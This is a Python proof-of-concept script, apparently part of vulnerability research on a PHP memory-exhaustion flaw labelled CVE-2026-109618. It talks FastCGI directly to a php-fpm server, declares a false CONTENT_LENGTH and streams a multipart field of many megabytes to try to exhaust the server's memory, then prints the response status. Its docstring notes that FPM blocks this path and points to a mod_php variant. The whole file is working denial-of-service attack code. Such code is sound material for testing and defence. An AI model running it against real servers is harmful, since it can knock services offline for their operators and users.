#!/usr/bin/env python3
"""FastCGI client that declares CONTENT_LENGTH=<declared> but streams a multipart body of <mb> MB in one
non-file field: the "no usable declared content length" OOM strategy of CVE-2026-109618. Stdlib only.
Result on php-fpm: FPM itself stops reading at CONTENT_LENGTH, so this strategy never reaches the parser
through FPM; it is a mod_php path (see test/oom-test.sh, chunked case, against php:<X.Y>-apache).
    python3 fcgi-lie.py host:port /path/mem-probe.php <mb> <declared>"""
import socket, struct, sys

hostport, script, mb, declared = sys.argv[1], sys.argv[2], int(sys.argv[3]), sys.argv[4]
host, port = hostport.rsplit(":", 1)
b = "----hplie"
head = (f"--{b}\r\nContent-Disposition: form-data; name=\"big\"\r\n\r\n").encode()
tail = f"\r\n--{b}--\r\n".encode()
params = {"GATEWAY_INTERFACE": "FastCGI/1.0", "REQUEST_METHOD": "POST", "SCRIPT_FILENAME": script,
          "SCRIPT_NAME": "/" + script.rsplit("/", 1)[1], "REQUEST_URI": "/" + script.rsplit("/", 1)[1],
          "SERVER_PROTOCOL": "HTTP/1.1", "CONTENT_TYPE": f"multipart/form-data; boundary={b}",
          "CONTENT_LENGTH": declared, "REMOTE_ADDR": "127.0.0.1", "SERVER_NAME": "localhost"}

def rec(t, c):
    return struct.pack(">BBHHBx", 1, t, 1, len(c), 0) + c

def nv(k, v):
    k, v = k.encode(), v.encode()
    lk = struct.pack(">B", len(k)) if len(k) < 128 else struct.pack(">I", len(k) | 0x80000000)
    lv = struct.pack(">B", len(v)) if len(v) < 128 else struct.pack(">I", len(v) | 0x80000000)
    return lk + lv + k + v

s = socket.create_connection((host, int(port)), timeout=120)
s.sendall(rec(1, struct.pack(">HB5x", 1, 0)) + rec(4, b"".join(nv(k, v) for k, v in params.items())) + rec(4, b""))
chunk = b"y" * 65000
sent_ok = True
try:
    s.sendall(rec(5, head))
    for _ in range(mb * 1048576 // 65000):
        s.sendall(rec(5, chunk))
    s.sendall(rec(5, tail) + rec(5, b""))
except (BrokenPipeError, ConnectionResetError):
    sent_ok = False
data = b""
try:
    while True:
        h = s.recv(8)
        if len(h) < 8:
            break
        _, t, _, cl, pl = struct.unpack(">BBHHBx", h)
        c = b""
        while len(c) < cl + pl:
            got = s.recv(cl + pl - len(c))
            if not got:
                break
            c += got
        if t == 6:
            data += c[:cl]
        if t == 3:
            break
except (ConnectionResetError, socket.timeout):
    pass
body = data.decode(errors="replace")
status = "200"
for line in body.split("\r\n"):
    if line.startswith("Status:"):
        status = line.split()[1]
print("sent_ok=%s status=%s %s" % (sent_ok, status, body[body.find("\r\n\r\n") + 4:].strip()[:150].replace("\n", " ")))
